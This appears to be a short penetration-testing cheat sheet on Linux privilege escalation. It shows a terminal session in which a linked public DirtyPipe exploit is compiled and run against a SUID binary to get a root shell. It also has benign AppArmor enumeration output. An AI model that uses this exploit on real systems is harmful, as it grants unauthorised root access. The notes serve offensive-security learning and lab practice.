# Abusing Setuid Binaries and Capabilities

## Dirty Pipe Exploit

If we encounter a SUID / SGID binary it's worth trying the DirtyPipez exploit\
[https://github.com/febinrev/dirtypipez-exploit](https://github.com/febinrev/dirtypipez-exploit)

```shell-session
victim@ubuntu:~$ ls
RESET_PASSWD  a.out  dirtypipez.c  linpeas.sh  local.txt  snap

victim@ubuntu:~$: gcc dirtypipez.c

victim@ubuntu:~$ ./a.out /home/victim/RESET_PASSWD 
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# whoami
root

```

## Enumeration

### AppArmor

AppArmor is a security system that is preinstalled on the mainline kernel since 2.6.36. It supplements Linux's Discreciniary Access Control (DAC) system with Mandatory Access Control (MAC).

#### Check if enabled

We can check if AppArmor is enabled with any user.

```shell-session
$ aa-enabled
Yes
```

#### Check Status (root)

We can check status as root&#x20;

```shell-session
$ aa-status
20 profiles are in enforce mode.
   /usr/bin/evince
   /usr/bin/evince-previewer
   /usr/bin/evince-previewer//sanitized_helper
   /usr/bin/evince-thumbnailer
   /usr/bin/evince//sanitized_helper
   /usr/bin/man
   /usr/lib/cups/backend/cups-pdf
   /usr/lib/x86_64-linux-gnu/lightdm/lightdm-guest-session
   /usr/lib/x86_64-linux-gnu/lightdm/lightdm-guest-session//chromium
   /usr/sbin/cups-browsed
   /usr/sbin/cupsd
   /usr/sbin/cupsd//third_party
   /usr/sbin/tcpdump
   libreoffice-senddoc
   libreoffice-soffice//gpg
   libreoffice-xpdfimport
   man_filter
   man_groff
   nvidia_modprobe
   nvidia_modprobe//kmod
2 profiles are in complain mode.
   libreoffice-oopslash
   libreoffice-soffice
2 processes have profiles defined.
2 processes are in enforce mode.
   /usr/sbin/cups-browsed (1053) 
   /usr/sbin/cupsd (1052) 
0 processes are in complain mode.
0 processes are unconfined but have a profile defined.

```
